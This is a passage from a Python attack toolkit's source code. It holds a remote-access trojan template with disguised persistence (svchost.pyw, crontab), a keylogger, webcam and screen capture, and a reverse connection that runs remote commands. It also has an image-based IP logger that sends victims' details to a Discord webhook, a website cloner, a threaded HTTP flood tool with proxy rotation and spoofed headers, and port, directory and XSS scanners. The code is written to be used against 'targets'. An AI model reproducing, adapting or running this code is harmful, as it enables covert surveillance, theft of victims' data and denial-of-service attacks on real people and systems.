            startup = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'svchost.pyw')
            shutil.copy2(script_path, startup)
            return "[+] Persistence installed (Startup folder)"
        else:
            script_path = os.path.abspath(sys.argv[0])
            cron_line = f"@reboot python3 {{script_path}} >/dev/null 2>&1"
            with open('/tmp/cronjob', 'w') as f:
                f.write(cron_line + "\\n")
            subprocess.run(['crontab', '/tmp/cronjob'], capture_output=True)
            os.remove('/tmp/cronjob')
            return "[+] Persistence installed (crontab)"
    except Exception as e:
        return f"[-] Persistence failed: {{str(e)}}"

def uninstall():
    try:
        script_path = sys.argv[0]
        os.remove(script_path)
        if os.name == 'nt':
            startup = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'svchost.pyw')
            if os.path.exists(startup):
                os.remove(startup)
    except:
        pass
    sys.exit(0)

def lock_screen():
    try:
        if os.name == 'nt':
            import ctypes
            ctypes.windll.user32.LockWorkStation()
        else:
            subprocess.run(['gnome-screensaver-command', '-l'], capture_output=True)
        return "[+] Screen locked"
    except:
        return "[-] Could not lock screen"

def shutdown_computer():
    try:
        if os.name == 'nt':
            subprocess.run(['shutdown', '/s', '/t', '10'], capture_output=True)
        else:
            subprocess.run(['shutdown', '-h', '+1'], capture_output=True)
        return "[+] Shutdown scheduled"
    except:
        return "[-] Could not shutdown"

def restart_computer():
    try:
        if os.name == 'nt':
            subprocess.run(['shutdown', '/r', '/t', '10'], capture_output=True)
        else:
            subprocess.run(['reboot'], capture_output=True)
        return "[+] Restart scheduled"
    except:
        return "[-] Could not restart"

class Keylogger:
    def __init__(self):
        self.running = False
        self.log = ""
        self.log_file = os.path.join(tempfile.gettempdir(), f"keylog_{{int(time.time())}}.txt")

    def start(self):
        self.running = True
        self.log = ""
        self.thread = threading.Thread(target=self._run)
        self.thread.daemon = True
        self.thread.start()
        return "[+] Keylogger started"

    def _run(self):
        try:
            from pynput import keyboard
            def on_press(key):
                if not self.running:
                    return False
                try:
                    self.log += key.char
                except AttributeError:
                    self.log += f" [{{key}}] "
                if len(self.log) > 1000:
                    self._save()
            listener = keyboard.Listener(on_press=on_press)
            listener.start()
            while self.running:
                time.sleep(1)
            listener.stop()
            self._save()
        except ImportError:
            self.log = "[ERROR] pynput not installed"
            self.running = False

    def _save(self):
        try:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(self.log)
                f.write("\\n")
            self.log = ""
        except:
            pass

    def stop(self):
        self.running = False
        if self.thread and self.thread.is_alive():
            self.thread.join(timeout=5)
        if os.path.exists(self.log_file):
            return self.log_file
        return None

keylogger = None

def handle_command(cmd):
    global keylogger

    if cmd.startswith("SHELL "):
        return execute_shell_command(cmd[6:])

    elif cmd == "SCREENSHOT":
        path = take_screenshot()
        if path and os.path.exists(path):
            return f"SCREENSHOT_SAVED:{{path}}"
        return "[-] Screenshot failed"

    elif cmd == "WEBCAM":
        path = capture_webcam()
        if path and os.path.exists(path):
            return f"WEBCAM_SAVED:{{path}}"
        return "[-] Webcam capture failed"

    elif cmd == "VIDEO":
        path = capture_video(10, 5)
        if path and os.path.exists(path):
            return f"VIDEO_SAVED:{{path}}"
        return "[-] Video capture failed"

    elif cmd == "SCREENVIDEO":
        path = capture_screen_video(10, 5)
        if path and os.path.exists(path):
            return f"SCREENVIDEO_SAVED:{{path}}"
        return "[-] Screen video capture failed"

    elif cmd == "KEYLOG_START":
        if keylogger is None:
            keylogger = Keylogger()
        return keylogger.start()

    elif cmd == "KEYLOG_STOP":
        if keylogger:
            path = keylogger.stop()
            keylogger = None
            if path:
                return f"KEYLOG_SAVED:{{path}}"
        return "[-] Keylogger not running"

    elif cmd == "SYSINFO":
        info = get_system_info()
        return json.dumps(info, indent=2)

    elif cmd == "PSLIST":
        return get_process_list()

    elif cmd.startswith("KILL "):
        return kill_process(cmd[5:])

    elif cmd == "PERSIST":
        return install_persistence()

    elif cmd == "UNINSTALL":
        uninstall()
        return ""

    elif cmd == "LOCK":
        return lock_screen()

    elif cmd == "SHUTDOWN":
        return shutdown_computer()

    elif cmd == "RESTART":
        return restart_computer()

    elif cmd == "DISCONNECT":
        return "DISCONNECT"

    return f"[!] Unknown command: {{cmd}}"

def receive_file(conn, save_path, file_size):
    try:
        with open(save_path, 'wb') as f:
            received = 0
            while received < file_size:
                chunk = conn.recv(min(8192, file_size - received))
                if not chunk:
                    break
                f.write(chunk)
                received += len(chunk)
        return True
    except:
        return False

def send_file(conn, file_path):
    if not os.path.exists(file_path):
        conn.send(b"FILE_NOT_FOUND\\n")
        return
    file_size = os.path.getsize(file_path)
    conn.send(f"FILE_SIZE:{{file_size}}\\n".encode())
    time.sleep(0.2)
    with open(file_path, 'rb') as f:
        data = f.read()
        conn.send(data)

def main():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((SERVER_HOST, SERVER_PORT))

            info = get_system_info()
            sock.send(json.dumps(info).encode())
            response = sock.recv(1024)

            while True:
                try:
                    cmd = sock.recv(65536).decode().strip()
                    if not cmd:
                        break

                    if cmd.startswith("DOWNLOAD "):
                        parts = cmd.split(" ")
                        if len(parts) >= 2:
                            remote_path = parts[1]
                            temp_path = parts[2] if len(parts) >= 3 else None
                            if temp_path:
                                send_file(sock, remote_path)

                    elif cmd.startswith("UPLOAD "):
                        parts = cmd.split(" ")
                        if len(parts) >= 3:
                            remote_path = parts[1]
                            file_size = int(parts[2])
                            receive_file(sock, remote_path, file_size)
                            sock.send(b"UPLOAD_COMPLETE\\n")

                    else:
                        result = handle_command(cmd)
                        if result == "DISCONNECT":
                            sock.close()
                            raise Exception("Disconnect")
                        sock.send(f"{{result}}\\n".encode())

                except socket.timeout:
                    continue
                except Exception as e:
                    break

            sock.close()
        except:
            time.sleep(5)

if __name__ == "__main__":
    main()
'''

# ========== IMAGE LOGGER FUNCTION (62) ==========
def generate_image_logger():
    logger_html = '''<!DOCTYPE html>
<html>
<head>
    <title>Image</title>
    <style>
        body { margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #000; }
        img { max-width: 100%; max-height: 100vh; cursor: pointer; }
    </style>
</head>
<body>
    <img id="targetImage" src="REPLACE_IMAGE_PATH" alt="Image" onclick="logClick()">
    <script>
        var webhookUrl = "REPLACE_WEBHOOK";
        var imageName = "REPLACE_IMAGE_NAME";
        
        function sendLog(data) {
            if (!webhookUrl || webhookUrl === "REPLACE_WEBHOOK") return;
            fetch(webhookUrl, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({content: data})
            }).catch(e => console.log(e));
        }
        
        function getIpInfo() {
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(data => {
                    var ip = data.ip;
                    fetch(`http://ip-api.com/json/${ip}`)
                        .then(r => r.json())
                        .then(info => {
                            var logData = `**IMAGE VIEWER LOGGED**\\n` +
                                `Image: ${imageName}\\n` +
                                `Time: ${new Date().toISOString()}\\n` +
                                `IP: ${ip}\\n` +
                                `Location: ${info.city}, ${info.country}\\n` +
                                `ISP: ${info.isp}\\n` +
                                `Browser: ${navigator.userAgent}\\n` +
                                `Screen: ${screen.width}x${screen.height}`;
                            sendLog(logData);
                        });
                });
        }
        
        function logClick() {
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(data => {
                    var ip = data.ip;
                    fetch(`http://ip-api.com/json/${ip}`)
                        .then(r => r.json())
                        .then(info => {
                            var logData = `**IMAGE CLICKED!**\\n` +
                                `Image: ${imageName}\\n` +
                                `Time: ${new Date().toISOString()}\\n` +
                                `IP: ${ip}\\n` +
                                `Location: ${info.city}, ${info.country}\\n` +
                                `ISP: ${info.isp}\\n` +
                                `Browser: ${navigator.userAgent}`;
                            sendLog(logData);
                            alert("Image opened");
                        });
                });
        }
        
        getIpInfo();
    </script>
</body>
</html>'''
    return logger_html

def tool_62():
    banner()
    print(f"{RED}{BOLD}[62] Image Click Logger Generator{RESET}\n")
    print(f"{CYAN}[*] Generates HTML wrapper that logs when someone clicks your image{RESET}\n")
    
    image_path = input(f"{RED}[?] Full path to your image file (.png, .jpg, .gif): {RESET}")
    if not os.path.exists(image_path):
        print(f"{RED}[-] Image file not found{RESET}")
        input()
        return
    
    webhook = input(f"{RED}[?] Discord webhook URL for logs: {RESET}")
    if not webhook:
        print(f"{RED}[-] Webhook required{RESET}")
        input()
        return
    
    output_html = input(f"{RED}[?] Output HTML filename (default: image_logger.html): {RESET}") or "image_logger.html"
    
    img_ext = os.path.splitext(image_path)[1]
    img_dest = f"image_{int(time.time())}{img_ext}"
    shutil.copy2(image_path, img_dest)
    
    html_code = generate_image_logger()
    html_code = html_code.replace("REPLACE_IMAGE_PATH", img_dest)
    html_code = html_code.replace("REPLACE_WEBHOOK", webhook)
    html_code = html_code.replace("REPLACE_IMAGE_NAME", os.path.basename(image_path))
    
    with open(output_html, 'w', encoding='utf-8') as f:
        f.write(html_code)
    
    print(f"\n{GREEN}[+] Image logger created!{RESET}")
    print(f"{GREEN}[+] HTML file: {output_html}{RESET}")
    print(f"{GREEN}[+] Image copy: {img_dest}{RESET}")
    print(f"\n{CYAN}[*] How to use:{RESET}")
    print(f"    1. Upload both files to a web server or hosting service")
    print(f"    2. Send the link to {output_html} to your target")
    print(f"    3. When they open the page and click the image, their IP and info will be sent to your webhook")
    input(f"\n{RED}[?] Press Enter{RESET}")

# ========== ENHANCED WEBSITE CLONER (92) ==========
def tool_63():
    banner()
    print(f"{RED}{BOLD}[92] Enhanced Website Cloner (Full Asset Download){RESET}\n")
    
    url = input(f"{RED}[?] URL to clone: {RESET}")
    if not url.startswith('http'):
        url = 'https://' + url
    
    out_dir = input(f"{RED}[?] Output directory: {RESET}") or f"cloned_{int(time.time())}"
    os.makedirs(out_dir, exist_ok=True)
    os.makedirs(f"{out_dir}/css", exist_ok=True)
    os.makedirs(f"{out_dir}/js", exist_ok=True)
    os.makedirs(f"{out_dir}/images", exist_ok=True)
    os.makedirs(f"{out_dir}/fonts", exist_ok=True)
    
    print(f"{CYAN}[*] Downloading {url}...{RESET}")
    
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        r = requests.get(url, headers=headers, timeout=15)
        html = r.text
        
        asset_count = 0
        
        css_urls = re.findall(r'href=[\'"]?([^\'" >]+\.css[^\'" >]*)', html)
        for css_url in css_urls:
            if not css_url.startswith('http'):
                css_url = urllib.parse.urljoin(url, css_url)
            try:
                css_r = requests.get(css_url, headers=headers, timeout=5)
                css_filename = os.path.basename(css_url.split('?')[0]) or f"style_{asset_count}.css"
                css_path = f"{out_dir}/css/{css_filename}"
                with open(css_path, 'w', encoding='utf-8') as f:
                    f.write(css_r.text)
                html = html.replace(css_url, f"css/{css_filename}")
                asset_count += 1
                print(f"{GREEN}[+] Downloaded CSS: {css_filename}{RESET}")
            except:
                pass
        
        js_urls = re.findall(r'src=[\'"]?([^\'" >]+\.js[^\'" >]*)', html)
        for js_url in js_urls:
            if not js_url.startswith('http'):
                js_url = urllib.parse.urljoin(url, js_url)
            try:
                js_r = requests.get(js_url, headers=headers, timeout=5)
                js_filename = os.path.basename(js_url.split('?')[0]) or f"script_{asset_count}.js"
                js_path = f"{out_dir}/js/{js_filename}"
                with open(js_path, 'w', encoding='utf-8') as f:
                    f.write(js_r.text)
                html = html.replace(js_url, f"js/{js_filename}")
                asset_count += 1
                print(f"{GREEN}[+] Downloaded JS: {js_filename}{RESET}")
            except:
                pass
        
        img_urls = re.findall(r'src=[\'"]?([^\'" >]+\.(png|jpg|jpeg|gif|svg|webp)[^\'" >]*)', html, re.I)
        img_urls = [u[0] for u in img_urls]
        for img_url in set(img_urls[:50]):
            if not img_url.startswith('http'):
                img_url = urllib.parse.urljoin(url, img_url)
            try:
                img_r = requests.get(img_url, headers=headers, timeout=5)
                img_filename = os.path.basename(img_url.split('?')[0])
                img_path = f"{out_dir}/images/{img_filename}"
                with open(img_path, 'wb') as f:
                    f.write(img_r.content)
                html = html.replace(img_url, f"images/{img_filename}")
                asset_count += 1
                print(f"{GREEN}[+] Downloaded image: {img_filename}{RESET}")
            except:
                pass
        
        with open(f"{out_dir}/index.html", 'w', encoding='utf-8') as f:
            f.write(html)
        
        print(f"\n{GREEN}[+] Clone completed!{RESET}")
        print(f"{GREEN}[+] Total assets downloaded: {asset_count}{RESET}")
        print(f"{GREEN}[+] Saved to: {out_dir}/index.html{RESET}")
        
    except Exception as e:
        print(f"{RED}[-] Clone failed: {e}{RESET}")
    
    input(f"\n{RED}[?] Press Enter{RESET}")

# ========== LAYER 7 DOS FLOODER (91) ==========
def tool_64():
    banner()
    print(f"{RED}{BOLD}[91] Layer 7 HTTP Flooder (DoS){RESET}\n")
    print(f"{RED}[!] WARNING: Use only on systems you own or have permission{RESET}\n")
    
    target = input(f"{RED}[?] Target URL (include http:// or https://): {RESET}")
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    duration = int(input(f"{RED}[?] Attack duration (seconds, 0 for infinite): {RESET}") or 60)
    threads = int(input(f"{RED}[?] Threads (default 200, max 1000): {RESET}") or 200)
    threads = min(threads, 1000)
    use_proxies = input(f"{RED}[?] Use proxy rotation? (y/n): {RESET}").lower() == 'y'
    
    print(f"\n{CYAN}[*] Starting flood on {target}{RESET}")
    print(f"{CYAN}[*] Threads: {threads} | Duration: {duration if duration > 0 else 'infinite'}{RESET}\n")
    
    stop_event = threading.Event()
    request_count = 0
    request_lock = threading.Lock()
    
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/17.1',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15',
    ]
    
    proxies_list = []
    proxy_lock = threading.Lock()
    
    def fetch_proxies():
        if not use_proxies:
            return
        print(f"{CYAN}[*] Fetching proxies...{RESET}")
        proxy_urls = [
            'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all',
            'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
            'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_HTTPS.txt',
        ]
        for url in proxy_urls:
            try:
                r = requests.get(url, timeout=10)
                if r.status_code == 200:
                    for line in r.text.split('\n'):
                        line = line.strip()
                        if line and ':' in line:
                            with proxy_lock:
                                proxies_list.append({'http': f'http://{line}', 'https': f'http://{line}'})
            except:
                pass
        print(f"{GREEN}[+] Loaded {len(proxies_list)} proxies{RESET}")
    
    def get_random_headers():
        return {
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        }
    
    def flood():
        nonlocal request_count
        session = requests.Session()
        if use_proxies and proxies_list:
            with proxy_lock:
                if proxies_list:
                    proxy = random.choice(proxies_list)
                    session.proxies = proxy
        
        while not stop_event.is_set():
            try:
                methods = ['GET', 'POST']
                method = random.choice(methods)
                
                if method == 'GET':
                    r = session.get(target, headers=get_random_headers(), timeout=3)
                else:
                    r = session.post(target, headers=get_random_headers(), data={'f': random.randint(1,999999)}, timeout=3)
                
                with request_lock:
                    request_count += 1
                    if request_count % 100 == 0:
                        print(f"{GREEN}[+] Requests sent: {request_count}{RESET}", end='\r')
                
                time.sleep(random.uniform(0.001, 0.01))
            except:
                if use_proxies and proxies_list:
                    with proxy_lock:
                        if proxies_list:
                            session.proxies = random.choice(proxies_list)
                continue
    
    fetch_thread = None
    if use_proxies:
        fetch_thread = threading.Thread(target=fetch_proxies)
        fetch_thread.start()
    
    time.sleep(2)
    
    workers = []
    for _ in range(threads):
        t = threading.Thread(target=flood)
        t.daemon = True
        t.start()
        workers.append(t)
    
    if duration > 0:
        time.sleep(duration)
        stop_event.set()
    else:
        input(f"\n{YELLOW}[*] Press Enter to stop flood{RESET}")
        stop_event.set()
    
    for t in workers:
        t.join(timeout=1)
    
    print(f"\n{GREEN}[+] Flood completed. Total requests: {request_count}{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

# ========== NETWORK RECON (01-15) ==========
def tool_01():
    banner()
    print(f"{RED}{BOLD}[01] IP Port Scanner{RESET}\n")
    target = input(f"{RED}[?] Target IP: {RESET}")
    print(f"{RED}[1] Quick (100 ports)  [2] Common (1-1000)  [3] Full (1-65535)  [4] Custom{RESET}")
    choice = input(f"{RED}[?] Select: {RESET}")
    
    if choice == '1':
        ports = [21,22,23,25,53,80,110,443,445,3306,3389,5432,5900,8080,8443]
    elif choice == '2':
        ports = range(1, 1001)
    elif choice == '3':
        ports = range(1, 65536)
    else:
        start = int(input(f"{RED}[?] Start port: {RESET}"))
        end = int(input(f"{RED}[?] End port: {RESET}"))
        ports = range(start, end + 1)
    
    open_ports = []
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            if sock.connect_ex((target, port)) == 0:
                print(f"{GREEN}✅ Port {port} OPEN{RESET}")
                open_ports.append(port)
            sock.close()
        except:
            pass
    print(f"\n{GREEN}✅ Open ports: {len(open_ports)}{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_02():
    banner()
    print(f"{RED}{BOLD}[02] IP Pinger{RESET}\n")
    target = input(f"{RED}[?] Target IP: {RESET}")
    count = int(input(f"{RED}[?] Number of pings: {RESET}") or 4)
    param = '-n' if os.name == 'nt' else '-c'
    result = subprocess.run(['ping', param, str(count), target], capture_output=True, text=True)
    print(result.stdout)
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_03():
    banner()
    print(f"{RED}{BOLD}[03] Traceroute{RESET}\n")
    target = input(f"{RED}[?] Target: {RESET}")
    if os.name == 'nt':
        cmd = ['tracert', '-d', '-h', '30', target]
    else:
        cmd = ['traceroute', '-n', '-m', '30', target]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in process.stdout:
        print(f"{CYAN}{line.strip()}{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_04():
    banner()
    print(f"{RED}{BOLD}[04] DNS Lookup{RESET}\n")
    domain = input(f"{RED}[?] Domain: {RESET}")
    for rec in ['A', 'MX', 'NS', 'TXT', 'AAAA']:
        try:
            answers = dns.resolver.resolve(domain, rec)
            print(f"{GREEN}{rec} Records:{RESET}")
            for r in answers:
                print(f"  {r}")
        except:
            pass
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_05():
    banner()
    print(f"{RED}{BOLD}[05] MAC Lookup{RESET}\n")
    mac = input(f"{RED}[?] MAC Address: {RESET}")
    mac = re.sub(r'[^A-F0-9]', '', mac.upper())[:6]
    try:
        r = requests.get(f"https://api.macvendors.com/{mac}", timeout=5)
        if r.status_code == 200:
            print(f"{GREEN}✅ Manufacturer: {r.text}{RESET}")
        else:
            print(f"{RED}❌ Not found{RESET}")
    except:
        print(f"{RED}❌ Lookup failed{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_06():
    banner()
    print(f"{RED}{BOLD}[06] SSL Checker{RESET}\n")
    domain = input(f"{RED}[?] Domain: {RESET}")
    try:
        import ssl
        ctx = ssl.create_default_context()
        with socket.create_connection((domain, 443), timeout=10) as sock:
            with ctx.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()
                print(f"{GREEN}Issuer: {cert.get('issuer')}{RESET}")
                print(f"{GREEN}Expires: {cert.get('notAfter')}{RESET}")
    except:
        print(f"{YELLOW}💡 Manual: https://www.ssllabs.com/ssltest/analyze.html?d={domain}{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_07():
    banner()
    print(f"{RED}{BOLD}[07] Proxy Checker{RESET}\n")
    proxy_list = input(f"{RED}[?] Proxy list (ip:port,ip:port): {RESET}")
    test_url = input(f"{RED}[?] Test URL: {RESET}") or "https://httpbin.org/ip"
    for p in proxy_list.split(','):
        p = p.strip()
        try:
            r = requests.get(test_url, proxies={"http": f"http://{p}", "https": f"http://{p}"}, timeout=5)
            if r.status_code == 200:
                print(f"{GREEN}✅ Working: {p}{RESET}")
            else:
                print(f"{RED}❌ Failed: {p}{RESET}")
        except:
            print(f"{RED}❌ Failed: {p}{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_08():
    banner()
    print(f"{RED}{BOLD}[08] Network Scanner (Ping Sweep){RESET}\n")
    network = input(f"{RED}[?] Network (192.168.1): {RESET}")
    active = []
    def ping(ip):
        try:
            param = '-n' if os.name == 'nt' else '-c'
            res = subprocess.run(['ping', param, '1', '-w', '500', ip], capture_output=True, text=True, timeout=2)
            if "Reply" in res.stdout or "1 received" in res.stdout:
                print(f"{GREEN}✅ {ip} - Active{RESET}")
                active.append(ip)
        except:
            pass
    with ThreadPoolExecutor(max_workers=50) as ex:
        for i in range(1, 255):
            ex.submit(ping, f"{network}.{i}")
    print(f"\n{GREEN}✅ Active hosts: {len(active)}{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_09():
    banner()
    print(f"{RED}{BOLD}[09] Proxy Scraper{RESET}\n")
    try:
        r = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all", timeout=10)
        if r.status_code == 200:
            proxies = [p.strip() for p in r.text.split('\r\n') if p.strip()]
            print(f"{GREEN}✅ Found {len(proxies)} proxies{RESET}")
            with open(f"{OUTPUT_DIR}proxies_{int(time.time())}.txt", 'w') as f:
                f.write('\n'.join(proxies))
            print(f"{GREEN}✅ Saved to {OUTPUT_DIR}proxies_{int(time.time())}.txt{RESET}")
        else:
            print(f"{RED}❌ Failed to fetch{RESET}")
    except:
        print(f"{RED}❌ Failed to fetch{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_10():
    banner()
    print(f"{RED}{BOLD}[10] Website Vulnerability Scanner{RESET}\n")
    url = input(f"{RED}[?] Target URL: {RESET}")
    if not url.startswith('http'):
        url = 'https://' + url
    payloads = ["'", '"', "<script>alert(1)</script>", "../../../etc/passwd"]
    for p in payloads:
        try:
            r = requests.get(f"{url}?test={p}", timeout=5)
            if p in r.text:
                print(f"{RED}⚠️ Possible XSS/RCE with: {p}{RESET}")
        except:
            pass
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_11():
    banner()
    print(f"{RED}{BOLD}[11] IP Lookup{RESET}\n")
    ip = input(f"{RED}[?] IP (blank for yours): {RESET}")
    if not ip:
        try:
            ip = requests.get('https://api.ipify.org').text
            print(f"\n{CYAN}[🔍] Your IP: {ip}{RESET}\n")
        except:
            print(f"{RED}❌ Could not detect IP{RESET}")
            input()
            return
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = r.json()
        if data.get('status') == 'success':
            print(f"{GREEN}📍 Country: {data['country']}{RESET}")
            print(f"{GREEN}📍 Region: {data['regionName']}{RESET}")
            print(f"{GREEN}📍 City: {data['city']}{RESET}")
            print(f"{GREEN}📍 ISP: {data['isp']}{RESET}")
        else:
            print(f"{RED}❌ Lookup failed{RESET}")
    except:
        print(f"{RED}❌ Error{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_12():
    banner()
    print(f"{RED}{BOLD}[12] Whois Lookup{RESET}\n")
    domain = input(f"{RED}[?] Domain: {RESET}")
    try:
        w = whois.whois(domain)
        print(f"{GREEN}📋 Domain: {w.domain_name}{RESET}")
        print(f"{GREEN}📋 Registrar: {w.registrar}{RESET}")
        print(f"{GREEN}📋 Created: {w.creation_date}{RESET}")
        print(f"{GREEN}📋 Expires: {w.expiration_date}{RESET}")
    except:
        print(f"{YELLOW}⚠️ Could not fetch WHOIS{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_13():
    banner()
    print(f"{RED}{BOLD}[13] IP Reputation Checker{RESET}\n")
    ip = input(f"{RED}[?] IP Address: {RESET}")
    try:
        r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
        if r.status_code == 200:
            data = r.json()
            print(f"{GREEN}📍 Country: {data.get('country_name', 'Unknown')}{RESET}")
            print(f"{GREEN}📍 ISP: {data.get('org', 'Unknown')}{RESET}")
    except:
        pass
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_14():
    banner()
    print(f"{RED}{BOLD}[14] Subdomain Finder{RESET}\n")
    domain = input(f"{RED}[?] Domain: {RESET}")
    subs = set()
    try:
        r = requests.get(f"https://crt.sh/?q=%25.{domain}&output=json", timeout=10)
        if r.status_code == 200:
            for entry in r.json()[:100]:
                name = entry.get('name_value', '')
                if name.endswith(domain):
                    subs.add(name)
            for s in list(subs)[:30]:
                print(f"{GREEN}✅ {s}{RESET}")
    except:
        print(f"{YELLOW}⚠️ Could not fetch subdomains{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_15():
    banner()
    print(f"{RED}{BOLD}[15] Port Scanner (Multi-threaded){RESET}\n")
    target = input(f"{RED}[?] Target IP: {RESET}")
    print(f"{RED}[1] Quick (100 ports)  [2] Common (1-1000)  [3] Full (1-65535)  [4] Custom{RESET}")
    choice = input(f"{RED}[?] Select: {RESET}")
    
    if choice == '1':
        ports = [21,22,23,25,53,80,110,443,445,3306,3389,5432,5900,8080,8443]
    elif choice == '2':
        ports = range(1, 1001)
    elif choice == '3':
        ports = range(1, 65536)
    else:
        start = int(input(f"{RED}[?] Start port: {RESET}"))
        end = int(input(f"{RED}[?] End port: {RESET}"))
        ports = range(start, end + 1)
    
    open_ports = []
    def scan(p):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            if sock.connect_ex((target, p)) == 0:
                print(f"{GREEN}✅ Port {p} OPEN{RESET}")
                open_ports.append(p)
            sock.close()
        except:
            pass
    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        list(ex.map(scan, ports))
    print(f"\n{GREEN}✅ Open ports: {len(open_ports)}{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

# ========== WEB SECURITY (16-24) ==========
def tool_16():
    banner()
    print(f"{RED}{BOLD}[16] HTTP Headers{RESET}\n")
    url = input(f"{RED}[?] URL: {RESET}")
    if not url.startswith('http'):
        url = 'https://' + url
    try:
        r = requests.get(url, timeout=10)
        print(f"{GREEN}Status: {r.status_code}{RESET}\n")
        for k, v in r.headers.items():
            print(f"  {k}: {v[:80]}")
    except:
        print(f"{RED}❌ Error fetching headers{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_17():
    banner()
    print(f"{RED}{BOLD}[17] WAF Detector{RESET}\n")
    url = input(f"{RED}[?] URL: {RESET}")
    if not url.startswith('http'):
        url = 'https://' + url
    detected = set()
    payloads = ["<script>alert(1)</script>", "' OR '1'='1", "../../../etc/passwd"]
    for p in payloads:
        try:
            r = requests.get(f"{url}?test={p}", timeout=5)
            if r.status_code in [403, 406, 501]:
                detected.add("Generic WAF")
            if 'cloudflare' in str(r.headers).lower():
                detected.add("Cloudflare")
        except:
            pass
    if detected:
        print(f"{GREEN}✅ WAF Detected: {', '.join(detected)}{RESET}")
    else:
        print(f"{YELLOW}⚠️ No obvious WAF detected{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_18():
    banner()
    print(f"{RED}{BOLD}[18] Technology Fingerprint{RESET}\n")
    url = input(f"{RED}[?] URL: {RESET}")
    if not url.startswith('http'):
        url = 'https://' + url
    try:
        r = requests.get(url, timeout=10)
        if 'Server' in r.headers:
            print(f"{GREEN}🖥️ Server: {r.headers['Server']}{RESET}")
        if 'X-Powered-By' in r.headers:
            print(f"{GREEN}⚡ Powered by: {r.headers['X-Powered-By']}{RESET}")
    except:
        print(f"{RED}❌ Error fetching data{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_19():
    banner()
    print(f"{RED}{BOLD}[19] Directory Bruteforcer{RESET}\n")
    url = input(f"{RED}[?] URL (without trailing slash): {RESET}")
    wordlist = ['admin', 'login', 'backup', 'config', 'api', 'test', 'dev', 'old', 'wp-admin', 'sql', 'logs', '.git', '.env', 'robots.txt']
    with ThreadPoolExecutor(max_workers=20) as ex:
        futures = {ex.submit(requests.get, f"{url}/{d}", timeout=5): d for d in wordlist}
        for future in as_completed(futures):
            try:
                r = future.result()
                d = futures[future]
                if r.status_code == 200:
                    print(f"{GREEN}✅ FOUND: {d}{RESET}")
                elif r.status_code == 403:
                    print(f"{YELLOW}⚠️ FORBIDDEN: {d}{RESET}")
            except:
                pass
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_20():
    banner()
    print(f"{RED}{BOLD}[20] CVE Scanner (Link){RESET}\n")
    software = input(f"{RED}[?] Software/version: {RESET}")
    encoded = urllib.parse.quote_plus(software)
    print(f"\n{CYAN}🔗 https://nvd.nist.gov/vuln/search/results?query={encoded}{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_21():
    banner()
    print(f"{RED}{BOLD}[21] Exploit DB Search (Link){RESET}\n")
